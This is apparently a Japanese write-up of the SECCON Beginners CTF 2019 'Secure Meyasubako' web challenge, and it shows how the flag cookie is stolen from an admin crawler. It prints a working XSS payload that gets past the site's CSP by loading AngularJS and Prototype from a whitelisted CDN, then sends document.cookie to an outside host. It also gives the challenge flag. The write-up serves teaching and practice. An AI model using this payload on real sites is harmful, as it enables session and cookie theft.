# SECCON Beginners CTF 2019 "Secure Meyasubako" writeup

## problem

```
みなさまからのご意見をお待ちしています。

https://meyasubako.quals.beginners.seccon.jp

参考: https://score.beginners.seccon.jp/files/f379baacbdd51cd8305869a633377aa4_crawl.js
```

crawl.js

```javascript
const puppeteer = require('puppeteer');
const flag = process.env.FLAG;
const browser_option = {
    executablePath: 'google-chrome-stable',
    headless: true,
    args: [
        '--no-sandbox',
        '--disable-background-networking',
        '--disable-default-apps',
        '--disable-extensions',
        '--disable-gpu',
        '--disable-sync',
        '--disable-translate',
        '--hide-scrollbars',
        '--metrics-recording-only',
        '--mute-audio',
        '--no-first-run',
        '--safebrowsing-disable-auto-update',
    ],
};
const default_cookie = {
    "domain": current_host,
    "expirationDate": 1597288045,
    "hostOnly": false,
    "httpOnly": false,
    "name": "flag",
    "path": "/",
    "sameSite": "no_restriction",
    "secure": false,
    "session": false,
    "storeId": "0",
    "value": flag,
    "id": 1
}


/* ... */

const browser = await puppeteer.launch(browser_option);
const page = await browser.newPage();
await page.goto(current_host, {waitUntil: 'networkidle2'});
await page.setCookie(default_cookie);
await page.goto(url, {waitUntil: 'networkidle2'});
await page.waitFor(3000);
await browser.close();
```

## solution

タイトルと意見からなるテキストを管理者に送ることができる

そしてクローラーには cookie に flag が設置されているのでこれを XSS を使って取り出す

試しに img タグを仕込むとアクセスが飛んでくる

```html
<img src="http://example.com/?value=image" />
```

しかしインラインスクリプトは実行されない

```html
<script>
  alert("XSS");
</script>
```

header を見てみると以下のようになっている

```
Content-Security-Policy: script-src 'self' www.google.com www.gstatic.com stackpath.bootstrapcdn.com code.jquery.com cdnjs.cloudflare.com
X-XSS-Protection: 0
```

CSP が有効となっていて、自分のサーバーからと google や CDN からの js のみを許可している

XSS Auditor はオフになっている

Google が提供している [CSP Evaluator - Google](https://csp-evaluator.withgoogle.com/) でサイトをチェックしてみると

```
www.gstatic.com : www.gstatic.com is known to host Angular libraries which allow to bypass this CSP.
cdnjs.cloudflare.com : cdnjs.cloudflare.com is known to host Angular libraries which allow to bypass this CSP.
```

gstatic.com は Google が、cdnjs.cloudflare.com は cloudflare が提供している CDN サービス

これらの CDN から Angular を読み込めれば CSP をバイパスできると警告される

[H5SC Minichallenge 3 - GitHub](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22)

このサイトで紹介されている 191 バイトの解法を試す

まずAngularJS と Prototype を読み込み、Function.prototype.curry を使ってグローバルオブジェクトを置き換えることで任意の js を実行できる

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<div ng-app ng-csp>{{$on.curry.call().location.replace('http://example.com/?'+($on.curry.call().document.cookie))}}</div>
```

```
/?flag=ctf4b{MEOW_MEOW_MEOW_NO_MORE_WHITELIST_MEOW}
```

[バイパス可能な angular のリスト - GitHub](https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76)

## 参考 writeup

<https://st98.github.io/diary/posts/2019-05-26-beginners-ctf.html#secure-meyasubako-433>

<https://qiita.com/kusano_k/items/c1c7ebec353d0bfdf1eb#secure-meyasubako-17-solves-433-points>
